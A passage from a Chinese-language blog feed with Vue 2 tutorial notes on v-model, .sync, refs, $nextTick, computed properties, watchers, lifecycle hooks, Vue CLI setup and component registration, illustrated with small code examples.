class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">&quot;msg&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">:value</span>=<span class="string">&quot;msg&quot;</span> @<span class="attr">input</span>=<span class="string">&quot;msg = $event.target.value&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>作用</strong>：</p><p>提供数据的<strong>双向绑定</strong></p><ul><li>数据变，视图跟着变 <code>:value</code></li><li>视图变，数据跟着变 <code>@input</code></li></ul><p><strong>注意</strong>：<code>$event</code> 用于在模板中，获取事件的形参</p><h2 id="表单类组件封装"><a href="#表单类组件封装" class="headerlink" title="表单类组件封装"></a>表单类组件封装</h2><p><strong>表单类组件封装</strong>：实现子组件和父组件的双向绑定</p><ol><li>父传子：数据应该是父组件 props 传递过来，拆解 v-model 绑定数据</li><li>子传父：监听输入，子传父传值给父组件修改</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240324150334.png" alt="image.png"></p><h2 id="v-model-简化代码"><a href="#v-model-简化代码" class="headerlink" title="v-model 简化代码"></a>v-model 简化代码</h2><p>v-model其实就是<code>:value</code>和<code>@input</code>事件的简写</p><ul><li>子组件：props通过value接收数据，事件触发 input</li><li>父组件：v-model直接绑定数据 （<code>:value</code> + <code>@input</code>）</li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240324151252.png" alt="image.png"></p><h2 id="sync-修饰符"><a href="#sync-修饰符" class="headerlink" title=".sync 修饰符"></a>.sync 修饰符</h2><p><strong>作用</strong>：可以实现子组件与父组件数据的双向绑定，简化代码</p><p><strong>特点</strong>：prop属性名，可以自定义，非固定的value</p><p><strong>本质</strong>：就是 <code>:属性名</code> 和 <code>@update:属性名</code> 合写</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240324153618.png" alt="image.png"></p><h2 id="ref-和-refs"><a href="#ref-和-refs" class="headerlink" title="ref 和 $refs"></a>ref 和 $refs</h2><p><strong>作用</strong>： 利用 ref 和 $refs 可以用于<strong>获取DOM元素</strong>或<strong>组件实例</strong></p><p><strong>特点</strong>：查找范围是当前组件内，更精确稳定</p><p><strong>获取DOM</strong>：</p><ol><li>目标标签 - 添加 ref 属性</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ref</span>=<span class="string">&quot;logoRef&quot;</span>&gt;</span>logo<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>通过<code>this.$refs.xxx</code>，获取目标标签</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">mounted</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="comment">// 需要在目标标签被渲染出来之后，才可以获取</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">$refs</span>.<span class="property">logoRef</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>获取组件</strong>：</p><ol><li>目标组件 - 添加 ref 属性</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">BaseForm</span> <span class="attr">ref</span>=<span class="string">&quot;baseForm&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">BaseForm</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>通过<code>this.$refs.xxx</code>，获取目标组件，里面可以调用对象里面的方法</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">$refs</span>.<span class="property">baseForm</span>.组件方法()</span><br></pre></td></tr></table></figure><h2 id="Vue-异步更新、-nextTick"><a href="#Vue-异步更新、-nextTick" class="headerlink" title="Vue 异步更新、$nextTick"></a>Vue 异步更新、$nextTick</h2><p>当我们需要渲染组件后立刻操作内容的话，可能会无法实现</p><p><strong>原因</strong>：Vue 是异步更新 DOM，目的是提高性能</p><p><code>$nextTick</code>：等DOM更新完成后，才会触发执行此行方法里的函数体</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.$nextTick(<span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$refs</span>.<span class="property">inp</span>.<span class="title function_">focus</span>() <span class="comment">// 用于实现现实输入框后聚焦输入框</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> Vue.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue-计算属性、侦听器、生命周期、工程化</title>
      <link href="/2024/03/23/Vue-%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7%E3%80%81%E4%BE%A6%E5%90%AC%E5%99%A8%E3%80%81%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E3%80%81%E5%B7%A5%E7%A8%8B%E5%8C%96/"/>
      <url>/2024/03/23/Vue-%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7%E3%80%81%E4%BE%A6%E5%90%AC%E5%99%A8%E3%80%81%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E3%80%81%E5%B7%A5%E7%A8%8B%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="计算属性"><a href="#计算属性" class="headerlink" title="计算属性"></a>计算属性</h1><p><strong>概念</strong>：基于现有的数据，计算出来的新属性。 依赖的数据变化，自动重新计算。 </p><p><strong>语法</strong>：</p><ol><li>声明在 computed 配置项中，一个计算属性对应一个函数</li><li>使用起来和普通属性一样使用 <code>&#123;&#123; 计算属性名 &#125;&#125;</code> 计算属性 → 可以将一段 求值的代码 进行封装</li></ol><p><strong>注意</strong>：</p><ol><li>computed配置项和data配置项是<strong>同级</strong>的</li><li>computed中的计算属性<strong>虽然是函数的写法</strong>，但他依然是个<strong>属性</strong></li><li>computed中的计算属性<strong>不能</strong>和data中的属性<strong>同名</strong></li><li>使用computed中的计算属性和使用data中的属性是一样的用法</li><li>computed中计算属性内部的this依然指向的是Vue实例</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>消费记录<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>用途<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>花销<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span> <span class="attr">v-for</span>=<span class="string">&quot;(item, index) in list&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;item.id&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; item.name &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>￥&#123;&#123; item.num &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>总共花销：￥ &#123;&#123; totalCount &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">list</span>: [</span></span><br><span class="line"><span class="language-javascript">&#123;<span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&#x27;iPhone15Pro&#x27;</span>, <span class="attr">num</span>: <span class="number">8999</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">&#123;<span class="attr">id</span>: <span class="number">2</span>, <span class="attr">name</span>: <span class="string">&#x27;iPad Pro&#x27;</span>, <span class="attr">num</span>: <span class="number">7999</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">&#123;<span class="attr">id</span>: <span class="number">3</span>, <span class="attr">name</span>: <span class="string">&#x27;AirPods&#x27;</span>, <span class="attr">num</span>: <span class="number">1999</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">&#123;<span class="attr">id</span>: <span class="number">4</span>, <span class="attr">name</span>: <span class="string">&#x27;Apple Watch&#x27;</span>, <span class="attr">num</span>: <span class="number">2999</span>&#125;</span></span><br><span class="line"><span class="language-javascript">]</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">computed</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">totalCount () &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">let</span> count = <span class="variable language_">this</span>.<span class="property">list</span>.<span class="title function_">reduce</span>(<span class="function">(<span class="params">sum, item</span>) =&gt;</span> sum + item.<span class="property">num</span>, <span class="number">0</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">return</span> count</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240323203610.png" alt="image.png"></p><ul><li>依赖的数据变化，也会自动计算新的结果。</li></ul><h2 id="计算属性-VS-方法"><a href="#计算属性-VS-方法" class="headerlink" title="计算属性 VS 方法"></a>计算属性 VS 方法</h2><p><strong>computed计算属性</strong>：</p><p><strong>作用</strong>：封装了一段对于<strong>数据</strong>的处理，求得一个<strong>结果</strong></p><p><strong>语法</strong>：</p><ol><li>写在computed配置项中</li><li>作为属性，直接使用<ul><li>js中使用计算属性： <code>this.计算属性</code></li><li>模板中使用计算属性：<code>&#123;&#123;计算属性&#125;&#125;</code></li></ul></li></ol><p><strong>methods计算属性</strong>：</p><p><strong>作用</strong>：给Vue实例提供一个<strong>方法</strong>，调用以<strong>处理业务逻辑</strong>。</p><p><strong>语法</strong>：</p><ol><li>写在methods配置项中</li><li>作为方法调用<ul><li>js中调用：<code>this.方法名()</code></li><li>模板中调用 <code>&#123;&#123;方法名()&#125;&#125;</code> 或者 <code>@事件名=&quot;方法名&quot;</code></li></ul></li></ol><p><strong>计算属性的优势</strong>：</p><p>计算属性会对计算出来的结果缓存，再次使用直接读取缓存， 依赖项变化了，会自动重新计算 → 并再次缓存</p><ol><li><p>computed<strong>有缓存特性</strong>，methods<strong>没有缓存</strong></p></li><li><p>当一个结果依赖其他多个值时，推荐使用计算属性</p></li><li><p>当处理业务逻辑时，推荐使用methods方法，比如事件的处理函数</p></li></ol><h2 id="完整写法"><a href="#完整写法" class="headerlink" title="完整写法"></a>完整写法</h2><ol><li>计算属性默认的简写，只能读取访问，不能 “修改”</li><li>如果要 “修改” → 需要写计算属性的完整写法</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 当我们需要修改计算属性的值时，是没办法改动的，这时候需要写完整写法 --&gt;</span><br><span class="line"><span class="attr">totalCount</span>: &#123;</span><br><span class="line"><span class="title function_">get</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">let</span> count = <span class="variable language_">this</span>.<span class="property">list</span>.<span class="title function_">reduce</span>(<span class="function">(<span class="params">sum, item</span>) =&gt;</span> sum + item.<span class="property">num</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> count</span><br><span class="line">&#125;,</span><br><span class="line"><span class="title function_">set</span>(<span class="params">value</span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="watch侦听器"><a href="#watch侦听器" class="headerlink" title="watch侦听器"></a>watch侦听器</h1><p><strong>作用</strong>：监视数据变化，执行一些 业务逻辑 或 异步操作。 </p><p><strong>语法</strong>：</p><ol><li>简单写法：简单类型数据，直接监视</li><li>完整写法：添加额外配置项</li></ol><ul><li><code>deep: true</code> 对复杂类型深度监视</li><li><code>immediate: true</code> 初始化立刻执行一次handler方法</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 1. 简单写法：简单类型数据，直接监视 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>加法计算器<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">v-model.trim.number</span>=<span class="string">&quot;num1&quot;</span>&gt;</span></span><br><span class="line">+</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">v-model.trim.number</span>=<span class="string">&quot;num2&quot;</span>&gt;</span></span><br><span class="line">= &#123;&#123; sum &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">num1</span>: <span class="number">0</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">num2</span>: <span class="number">0</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">sum</span>: <span class="number">0</span></span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">watch</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">num1 (newValue, oldValue)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">this</span>.<span class="property">sum</span> = newValue + <span class="variable language_">this</span>.<span class="property">num2</span></span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript">num2 (newValue) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">this</span>.<span class="property">sum</span> = newValue + <span class="variable language_">this</span>.<span class="property">num1</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 2. 完整写法：添加额外配置项 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>加法计算器<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">v-model.trim.number</span>=<span class="string">&quot;num.num1&quot;</span>&gt;</span></span><br><span class="line">+</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">v-model.trim.number</span>=<span class="string">&quot;num.num2&quot;</span>&gt;</span></span><br><span class="line">= &#123;&#123; num.sum &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">num</span>: &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">num1</span>: <span class="number">0</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">num2</span>: <span class="number">0</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">sum</span>: <span class="number">0</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">watch</span>: &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">num</span>: &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">deep</span>: <span class="literal">true</span>, <span class="comment">// 对复杂类型深度监视</span></span></span><br><span class="line"><span class="language-javascript"><span class="attr">immediate</span>: <span class="literal">true</span>, <span class="comment">// 初始化立刻执行一次handler方法</span></span></span><br><span class="line"><span class="language-javascript">handler () &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">this</span>.<span class="property">num</span>.<span class="property">sum</span> = <span class="variable language_">this</span>.<span class="property">num</span>.<span class="property">num1</span> + <span class="variable language_">this</span>.<span class="property">num</span>.<span class="property">num2</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240323213502.png" alt="image.png"></p><h1 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h1><p>Vue<strong>生命周期</strong>：就是一个Vue实例从创建 到 销毁 的整个过程。</p><p>生命周期四个阶段：创建、挂载、更新、销毁</p><ol><li>创建阶段：创建响应式数据</li><li>挂载阶段：渲染模板</li><li>更新阶段：修改数据，更新视图</li><li>销毁阶段：销毁Vue实例</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1682065937815.png" alt="1682065937815.png"></p><p>Vue生命周期过程中，会自动运行一些函数，被称为<strong>生命周期钩子</strong>，让开发者可以在<strong>特定阶段</strong>运行自己的代码。</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1682066040295.png" alt="1682066040295.png"></p><p><strong>created</strong>()：响应式数据准备好了，开始初始化渲染请求</p><p><strong>mounted</strong>()：模板渲染完成，开始操作DOM</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line"><span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line"><span class="attr">data</span>: &#123;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">watch</span>: &#123;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="title function_">created</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;响应式数据准备好了&#x27;</span>); <span class="comment">// 可以放置网络请求渲染数据的方法</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="title function_">mounted</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;模板渲染完成&#x27;</span>); <span class="comment">// 可以放置文本框聚焦的方法</span></span><br><span class="line"><span class="comment">// document.querySelector(&#x27;#inp&#x27;).focus() // 文本框聚焦</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="工程化开发入门"><a href="#工程化开发入门" class="headerlink" title="工程化开发入门"></a>工程化开发入门</h1><p><strong>开发Vue的两种方式</strong>：</p><ul><li>核心包传统开发模式：基于html &#x2F; css &#x2F; js 文件，直接引入核心包，开发 Vue。</li><li><strong>工程化开发模式：基于构建工具（例如：webpack）的环境中开发Vue。</strong></li></ul><h2 id="脚手架Vue-CLI"><a href="#脚手架Vue-CLI" class="headerlink" title="脚手架Vue CLI"></a>脚手架Vue CLI</h2><p><strong>介绍</strong>：</p><p>Vue CLI 是Vue官方提供的一个<strong>全局命令工具</strong></p><p>可以帮助我们<strong>快速创建</strong>一个开发Vue项目的<strong>标准化基础架子</strong>。集成了webpack配置</p><p><strong>好处</strong>：</p><ol><li>开箱即用，零配置</li><li>内置babel等工具</li><li>标准化的webpack配置</li></ol><p><strong>使用步骤</strong>：</p><ol><li>全局安装（只需安装一次即可） <code>yarn global add @vue/cli</code> 或者 <code>npm i @vue/cli -g</code></li><li>查看vue&#x2F;cli版本： <code>vue --version</code></li><li>创建项目架子：<code>vue create project-name</code>(项目名不能使用中文)</li><li>启动项目：<code>yarn serve</code> 或者 <code>npm run serve</code>(命令不固定，找package.json)</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240323223220.png" alt="image.png"></p><p><strong>默认初始化界面</strong>：</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240323223433.png" alt="image.png"></p><p><strong>运行流程</strong>：</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240323223948.png" alt="image.png"></p><p><strong>main.js核心代码</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span> <span class="comment">// 导入Vue</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span> <span class="comment">// 导入 App.vue</span></span><br><span class="line">  </span><br><span class="line"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123; <span class="comment">// 实例化 Vue， 将 App.vue 渲染到index.html容器当中</span></span><br><span class="line">  <span class="attr">render</span>: <span class="function"><span class="params">h</span> =&gt;</span> <span class="title function_">h</span>(<span class="title class_">App</span>),</span><br><span class="line">&#125;).$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="组件化开发"><a href="#组件化开发" class="headerlink" title="组件化开发"></a>组件化开发</h2><p><strong>组件化</strong>：一个页面可以拆分成一个个组件，每个组件有着自己独立的结构、样式、行为。</p><p>​<strong>好处</strong>：便于维护，利于复用，提升开发效率。</p><p>​<strong>组件分类</strong>：普通组件、根组件。</p><p>​比如：下面这个页面，可以把所有的代码都写在一个页面中，但是这样显得代码比较混乱，难易维护。咱们可以按模块进行组件划分</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1682168852372.png" alt="1682168852372.png"></p><h2 id="根组件-App-vue"><a href="#根组件-App-vue" class="headerlink" title="根组件 App.vue"></a>根组件 App.vue</h2><p>整个应用最上层的组件，包裹所有普通小组件</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1682169195029.png" alt="1682169195029.png"></p><ul><li><code>template</code>：结构 （有且只能一个根元素）</li><li><code>script</code>：js逻辑</li><li><code>style</code>：样式 (可支持less，需要装包)</li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240323224615.png" alt="image.png"></p><p><strong>让组件支持less</strong></p><ol><li>style标签，<code>lang=&quot;less&quot;</code> 开启less功能</li><li>装包: <code>yarn add less less-loader -D</code> 或者<code>npm i less less-loader -D</code></li></ol><h2 id="普通组件的注册使用"><a href="#普通组件的注册使用" class="headerlink" title="普通组件的注册使用"></a>普通组件的注册使用</h2><p><strong>局部注册</strong>：只能在注册的组件内使用</p><ol><li>创建 .vue 文件 (三个组成部分) 